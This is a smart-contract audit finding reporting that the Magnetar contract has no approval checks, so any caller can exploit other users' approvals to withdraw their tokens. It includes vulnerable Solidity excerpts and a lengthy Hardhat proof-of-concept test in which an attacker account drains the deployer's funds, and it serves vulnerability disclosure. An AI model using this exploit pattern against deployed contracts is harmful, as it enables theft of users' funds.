[H-38] Magnetar contract has no approval checking
Submitted bycarrotsmuggler, also found by0xStalin
TheMagnetar.solcontract has a lot of useful helper function to carry out operations on user market positions. If a user wishes to use the helper functions, they have to first give approval to the Magnetar contract to manipulate their positions. As an example, for the big bang markets, this is done by calling theupdateOperatorfunction.
functionupdateOperator(addressoperator,boolstatus)external{operators[msg.sender][operator] =status;}
Since this is a helper function, we can expect users to give this approval in order to use these functions. However the issue is that any attacker can use these approvals to manipulate and drain positions of other users.
As an example, let us look at thewithdrawToChainfunction. Lets assume an attacker is calling this function, and the victimâ€™s address is passed in thefromfield. Assume the victim has given all approvals to the Magnetar contracts. The function delegates this to thewithdrawToChainin the Market module.
InwithdrawToChainfunction, there are no checks on themsg.senderaddress. The function interacts with yieldbox and does a crosschain send to theerceiveraddress passed by the attacker.
if(dstChainId==0) {yieldBox.withdraw(assetId,from,LzLib.bytes32ToAddress(receiver),amount,share);return;}yieldBox.withdraw(assetId,from,address(this),amount,0);ISendFrom(address(asset)).sendFrom{value:gas}(address(this),dstChainId,receiver,amount,callParams);
This sends the tokens to thereceiveraddress either in the same chain or cross-chain. This lets any user steal tokens from any other user, exploiting the approval given to the magnetar address.
While this report only discusses the issue with this one function, the same issue is present for every function in the magnetar contract. This allows attackers to manipulate bigbang markets and singularity markets as well. Thus this is a high severity issue.
Proof of Concept
A POC is developed by editing the test present in magnetar.test.ts. Only a single change is made to the test. The lastwithdrawToChaincall is done from theeoa1address instead of the deployer address.
it.only("should test withdrawTo",async()=>{const{deployer,eoa1,yieldBox,createTokenEmptyStrategy,deployCurveStableToUsdoBidder,usd0,bar,__wethUsdcPrice,wethUsdcOracle,weth,wethAssetId,mediumRiskMC,usdc,magnetar,initContracts,timeTravel,} =awaitloadFixture(register)constusdoStratregy=awaitbar.emptyStrategies(usd0.address)constusdoAssetId=awaityieldBox.ids(1,usd0.address,usdoStratregy,0)//Deploy & set SingularityconstSGLLiquidation=newSGLLiquidation__factory(deployer)const_sglLiquidationModule=awaitSGLLiquidation.deploy()constSGLCollateral=newSGLCollateral__factory(deployer)const_sglCollateralModule=awaitSGLCollateral.deploy()constSGLBorrow=newSGLBorrow__factory(deployer)const_sglBorrowModule=awaitSGLBorrow.deploy()constSGLLeverage=newSGLLeverage__factory(deployer)const_sglLeverageModule=awaitSGLLeverage.deploy()constnewPrice=__wethUsdcPrice.div(1000000)awaitwethUsdcOracle.set(newPrice)constsglData=newethers.utils.AbiCoder().encode(["address","address","address","address","address","address","uint256","address","uint256","address","uint256",],[_sglLiquidationModule.address,_sglBorrowModule.address,_sglCollateralModule.address,_sglLeverageModule.address,bar.address,usd0.address,usdoAssetId,weth.address,wethAssetId,wethUsdcOracle.address,ethers.utils.parseEther("1"),])awaitbar.registerSingularity(mediumRiskMC.address,sglData,true)constwethUsdoSingularity=newethers.Contract(awaitbar.clonesOf(mediumRiskMC.address,(awaitbar.clonesOfCount(mediumRiskMC.address)).sub(1)),SingularityArtifact.abi,ethers.provider).connect(deployer)//Deploy & set LiquidationQueueawaitusd0.setMinterStatus(wethUsdoSingularity.address,true)awaitusd0.setBurnerStatus(wethUsdoSingularity.address,true)constLiquidationQueueFactory=awaitethers.getContractFactory("LiquidationQueue")constliquidationQueue=awaitLiquidationQueueFactory.deploy()constfeeCollector=newethers.Wallet(ethers.Wallet.createRandom().privateKey,ethers.provider)const{stableToUsdoBidder} =awaitdeployCurveStableToUsdoBidder(deployer,bar,usdc,usd0)constLQ_META= {activationTime:600,// 10minminBidAmount:ethers.BigNumber.from((1e18).toString()).mul(200),// 200 USDCcloseToMinBidAmount:ethers.BigNumber.from((1e18).toString()).mul(202),defaultBidAmount:ethers.BigNumber.from((1e18).toString()).mul(400),// 400 USDCfeeCollector:feeCollector.address,bidExecutionSwapper:ethers.constants.AddressZero,usdoSwapper:stableToUsdoBidder.address,}awaitliquidationQueue.init(LQ_META,wethUsdoSingularity.address)constpayload=wethUsdoSingularity.interface.encodeFunctionData("setLiquidationQueueConfig",[liquidationQueue.address,ethers.constants.AddressZero,ethers.constants.AddressZero,])await(awaitbar.executeMarketFn([wethUsdoSingularity.address],[payload],true)).wait()constusdoAmount=ethers.BigNumber.from((1e18).toString()).mul(10)constusdoShare=awaityieldBox.toShare(usdoAssetId,usdoAmount,false)awaitusd0.mint(deployer.address,usdoAmount)constdepositAssetEncoded=yieldBox.interface.encodeFunctionData("depositAsset",[usdoAssetId,deployer.address,deployer.address,0,usdoShare])constsglLendEncoded=wethUsdoSingularity.interface.encodeFunctionData("addAsset",[deployer.address,deployer.address,false,usdoShare])awaitusd0.approve(magnetar.address,ethers.constants.MaxUint256)awaitusd0.approve(yieldBox.address,ethers.constants.MaxUint256)awaitusd0.approve(wethUsdoSingularity.address,ethers.constants.MaxUint256)awaityieldBox.setApprovalForAll(deployer.address,true)awaityieldBox.setApprovalForAll(wethUsdoSingularity.address,true)awaityieldBox.setApprovalForAll(magnetar.address,true)awaitweth.approve(yieldBox.address,ethers.constants.MaxUint256)awaitweth.approve(magnetar.address,ethers.constants.MaxUint256)awaitwethUsdoSingularity.approve(magnetar.address,ethers.constants.MaxUint256)constcalls= [{id:100,target:yieldBox.address,value:0,allowFailure:false,call:depositAssetEncoded,},{id:203,target:wethUsdoSingularity.address,value:0,allowFailure:false,call:sglLendEncoded,},]awaitmagnetar.connect(deployer).burst(calls)constybBalance=awaityieldBox.balanceOf(deployer.address,usdoAssetId)expect(ybBalance.eq(0)).to.be.trueconstsglBalance=awaitwethUsdoSingularity.balanceOf(deployer.address)expect(sglBalance.gt(0)).to.be.trueconstborrowAmount=ethers.BigNumber.from((1e17).toString())awaittimeTravel(86401)constwethMintVal=ethers.BigNumber.from((1e18).toString()).mul(1)awaitweth.freeMint(wethMintVal)awaitwethUsdoSingularity.connect(deployer).approveBorrow(magnetar.address,ethers.constants.MaxUint256)constborrowFn=magnetar.interface.encodeFunctionData("depositAddCollateralAndBorrowFromMarket",[wethUsdoSingularity.address,deployer.address,wethMintVal,0,true,true,{withdraw:false,withdrawLzFeeAmount:0,withdrawOnOtherChain:false,withdrawLzChainId:0,withdrawAdapterParams:ethers.utils.toUtf8Bytes(""),},])letborrowPart=awaitwethUsdoSingularity.userBorrowPart(deployer.address)expect(borrowPart.eq(0)).to.be.trueawaitmagnetar.connect(deployer).burst([{id:206,target:magnetar.address,value:ethers.utils.parseEther("2"),allowFailure:false,call:borrowFn,},],{value:ethers.utils.parseEther("2"),})constcollateralBalance=awaitwethUsdoSingularity.userCollateralShare(deployer.address)constcollateralAmpunt=awaityieldBox.toAmount(wethAssetId,collateralBalance,false)expect(collateralAmpunt.eq(wethMintVal)).to.be.trueconsttotalAsset=awaitwethUsdoSingularity.totalSupply()awaitwethUsdoSingularity.connect(deployer).borrow(deployer.address,deployer.address,borrowAmount)borrowPart=awaitwethUsdoSingularity.userBorrowPart(deployer.address)expect(borrowPart.gte(borrowAmount)).to.be.trueconstreceiverSplit=deployer.address.split("0x")awaitmagnetar.connect(eoa1).withdrawToChain(yieldBox.address,deployer.address,usdoAssetId,0,"0x".concat(receiverSplit[1].padStart(64,"0")),borrowAmount,0,"0x00",deployer.address,0)constusdoBalanceOfDeployer=awaitusd0.balanceOf(deployer.address)expect(usdoBalanceOfDeployer.eq(borrowAmount)).to.be.true})
This test passes, showing that theeoa1address is able to withdraw tokens belonging to the deployer.
Tools Used
Hardhat
Recommended Mitigation Steps
Add approval checks to all functions in the Magnetar contract.
0xRektora (Tapioca) confirmed